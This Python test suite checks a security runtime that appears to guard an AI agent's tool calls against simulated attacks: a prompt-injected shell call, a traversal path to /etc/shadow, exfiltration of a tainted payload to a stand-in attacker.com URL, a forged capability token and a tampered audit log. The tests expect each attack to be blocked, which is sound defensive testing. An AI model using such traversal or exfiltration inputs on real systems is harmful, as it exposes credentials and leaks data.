"""
AegisKernel: Enterprise Runtime & Threat Simulation Test Suite
==============================================================
Validates the 5 Core Enterprise Remediation Modules:
1. Capability-Based Access Control (CBAC) with Ephemeral TTL Leases
2. Canonical Path Resolution vs. Directory Traversal
3. Deep Taint Tracking & Serialization Integrity
4. Append-Only HMAC-SHA256 Cryptographic Hash Chaining & Tamper Detection
5. Microsecond Latency Enforcement Benchmarking
"""

import os
import sys
import time
import json
import tempfile
import unittest
from pathlib import Path

# Add project root to sys.path
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from services.runtime import (
    AegisSecurityRuntime,
    CapabilityType,
    CapabilityUnauthorizedException,
    PathTraversalViolation,
    TaintedString,
    AegisJSONEncoder,
    AegisJSONDecoder,
    is_tainted,
    TaintViolationException
)

class TestEnterpriseSecurityRuntime(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace = Path(self.temp_dir.name).resolve()
        
        # Create a sample allowed file
        self.safe_file = self.workspace / "sample.txt"
        self.safe_file.write_text("Confidential Enterprise Report 2026", encoding="utf-8")

        # Initialize isolated runtime instance
        self.runtime = AegisSecurityRuntime(allowed_workspaces=[self.workspace])

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_attack_1_direct_prompt_injection_blocked(self):
        """
        Attack 1: Attacker attempts to force model to invoke unauthorized shell execution.
        Zero ambient authority ensures tool call is BLOCKED by default.
        """
        @self.runtime.protect(required_capabilities=[CapabilityType.SHELL_EXEC])
        def execute_shell_command(cmd: str):
            return f"Executed: {cmd}"

        # Attempt to run without capability lease
        with self.assertRaises(CapabilityUnauthorizedException) as ctx:
            execute_shell_command("whoami")
        
        self.assertIn("lacks active capability lease for SHELL_EXEC", str(ctx.exception))
        
        # Verify attempt was recorded in audit chain
        last_rec = self.runtime.audit_ledger.records[-1]
        self.assertEqual(last_rec.event_type, "POLICY_DENY")
        self.assertEqual(last_rec.action_verdict, "BLOCKED")

    def test_attack_2_path_traversal_blocked(self):
        """
        Attack 2: Attacker injects traversal payload (../../etc/shadow) to escape workspace.
        Canonical path resolution detects and blocks the escape before any syscall.
        """
        @self.runtime.protect(required_capabilities=[CapabilityType.FILE_READ], path_param="file_path")
        def read_file(file_path: str):
            with open(file_path, "r") as f:
                return f.read()

        # Grant valid read capability
        with self.runtime.capability_engine.grant_lease(CapabilityType.FILE_READ):
            # Normal in-workspace read succeeds
            res = read_file(str(self.safe_file))
            self.assertEqual(res, "Confidential Enterprise Report 2026")

            # Path traversal attempt is BLOCKED
            traversal_path = str(self.workspace / ".." / ".." / "etc" / "shadow")
            with self.assertRaises(PathTraversalViolation):
                read_file(traversal_path)

    def test_attack_3_data_exfiltration_blocked_via_taint(self):
        """
        Attack 3: Attacker fetches untrusted web content and tries to exfiltrate it.
        Taint Tracking Engine flags parameter as TAINTED and aborts execution.
        """
        @self.runtime.protect(required_capabilities=[CapabilityType.NETWORK_OUTBOUND], require_clean=True)
        def http_post_sink(url: str, payload: str):
            return f"Transmitted to {url}"

        # External untrusted input tagged with TaintedString
        untrusted_payload = TaintedString("ATTACKER_DIRECTIVE_LEAK_KEYS", origin_source="EXTERNAL_WEB_SCRAPE")
        self.assertTrue(is_tainted(untrusted_payload))

        with self.runtime.capability_engine.grant_lease(CapabilityType.NETWORK_OUTBOUND):
            # Clean string is permitted
            clean_res = http_post_sink("https://api.internal.corp", "clean_operational_metric")
            self.assertIn("Transmitted", clean_res)

            # Tainted string is blocked at the sink
            with self.assertRaises(TaintViolationException):
                http_post_sink("https://api.attacker.com/leak", untrusted_payload)

    def test_attack_4_forged_capability_token_rejected(self):
        """
        Attack 4: Attacker attempts to forge or tamper with a capability token.
        HMAC signature verification detects the forgery immediately.
        """
        engine = self.runtime.capability_engine
        valid_token = engine.issue_token(CapabilityType.FILE_READ, ttl_seconds=60)
        self.assertTrue(engine.verify_token(valid_token))

        # Attacker tampers with token to elevate privilege to SHELL_EXEC
        tampered_token = type(valid_token)(
            token_id=valid_token.token_id,
            capability=CapabilityType.SHELL_EXEC, # Elevated!
            resource_pattern=valid_token.resource_pattern,
            granted_at=valid_token.granted_at,
            ttl_seconds=valid_token.ttl_seconds,
            signature=valid_token.signature # Reused signature
        )

        # Forged token MUST be rejected
        self.assertFalse(engine.verify_token(tampered_token))

    def test_attack_5_audit_log_tamper_detection(self):
        """
        Attack 5: Attacker attempts to modify an existing log record post-incident.
        Cryptographic HMAC-SHA256 hash chaining detects the break in the chain.
        """
        ledger = self.runtime.audit_ledger
        
        # Generate 5 chained records
        for i in range(5):
            ledger.append(
                event_type="TOOL_EXECUTION",
                tool_name=f"tool_{i}",
                principal_id="test-agent",
                parameters={"step": i},
                verdict="ALLOWED"
            )

        # Chain must verify cleanly
        valid, err_idx = ledger.verify_integrity()
        self.assertTrue(valid)
        self.assertIsNone(err_idx)

        # Attacker modifies record #2
        ledger.records[2].action_verdict = "TAMPERED_VERDICT"

        # Verification must catch the tampering at index 2
        valid, err_idx = ledger.verify_integrity()
        self.assertFalse(valid)
        self.assertEqual(err_idx, 2)

    def test_deep_taint_json_serialization_preservation(self):
        """
        Validates that TaintedString provenance survives JSON serialization & deserialization.
        """
        tainted_str = TaintedString("secret_api_key_4412", origin_source="RAG_DOCUMENT_STORE")
        data = {"session_id": "sess_99", "user_content": tainted_str}

        # Serialize using AegisJSONEncoder
        serialized_json = json.dumps(data, cls=AegisJSONEncoder)
        self.assertIn("__aegis_taint__", serialized_json)

        # Deserialize using AegisJSONDecoder
        restored_data = json.loads(serialized_json, cls=AegisJSONDecoder)
        restored_str = restored_data["user_content"]

        self.assertIsInstance(restored_str, TaintedString)
        self.assertEqual(str(restored_str), "secret_api_key_4412")
        self.assertEqual(restored_str.origin_source, "RAG_DOCUMENT_STORE")
        self.assertTrue(is_tainted(restored_data))

    def test_microsecond_latency_benchmark(self):
        """
        Benchmark: 1,000 policy checks must evaluate with median latency <= 20 microseconds.
        """
        @self.runtime.protect(required_capabilities=[CapabilityType.FILE_READ])
        def fast_tool(val: int):
            return val * 2

        with self.runtime.capability_engine.grant_lease(CapabilityType.FILE_READ):
            start = time.perf_counter()
            iterations = 1000
            for i in range(iterations):
                fast_tool(i)
            elapsed = time.perf_counter() - start

        avg_latency_ms = (elapsed / iterations) * 1000
        print(f"\n[BENCHMARK] Average Policy Evaluation Latency: {avg_latency_ms * 1000:.2f} µs ({avg_latency_ms:.4f} ms)")
        self.assertLess(avg_latency_ms, 0.05) # Must be under 50 microseconds

if __name__ == "__main__":
    unittest.main()
